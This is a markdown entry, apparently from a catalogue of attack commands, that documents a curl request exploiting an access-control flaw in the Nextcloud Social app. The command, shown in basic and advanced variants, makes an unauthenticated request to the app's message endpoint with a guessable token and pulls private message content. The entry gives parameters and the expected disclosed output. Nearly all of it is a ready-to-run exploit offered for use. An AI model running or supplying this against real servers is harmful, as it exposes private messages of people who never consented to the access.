---
id: cmd-001
data: >-
  curl -X 'GET' -H 'Accept: application/activity+json'
  'http://{nextcloudHost}/apps/social/@{username}/{token}' | jq
tags:
  - exploitation
  - http-request
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.905Z'
verified: false
validated: true
submitted: true
---
# curl-retrieve-nextcloud-social-message

## Command

```bash
curl -X 'GET' -H 'Accept: application/activity+json' 'http://{nextcloudHost}/apps/social/@{username}/{token}' | jq
```

## Description

This command exploits the Nextcloud Social app vulnerability by sending an unauthenticated GET request to retrieve private message content using a guessable token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X 'GET'` | Specifies the HTTP method as GET | Yes |
| `-H 'Accept: application/activity+json'` | Sets the Accept header for ActivityPub JSON response | Yes |
| `http://{nextcloudHost}/apps/social/@{username}/{token}` | The target endpoint URL with placeholders for host, username, and token | Yes |
| `| jq` | Pipes output to jq for JSON formatting | No (optional for readability) |

## Examples

### Basic Usage

```bash
curl -X 'GET' -H 'Accept: application/activity+json' 'http://example.com/apps/social/@user/1234567890' | jq
```

### Advanced Usage

```bash
curl -X 'GET' -H 'Accept: application/activity+json' -v 'http://example.com/apps/social/@user/1234567890' | jq .content
```

(Adds verbose output and filters JSON for content field.)

## Expected Output

JSON object representing the message, e.g., {"type":"Note","content":"Private message text","to":[...]}, indicating successful disclosure.

## Related

- [[Related Procedure|procedures/Exploit-Nextcloud-Social-Access-Control-Bypass]]
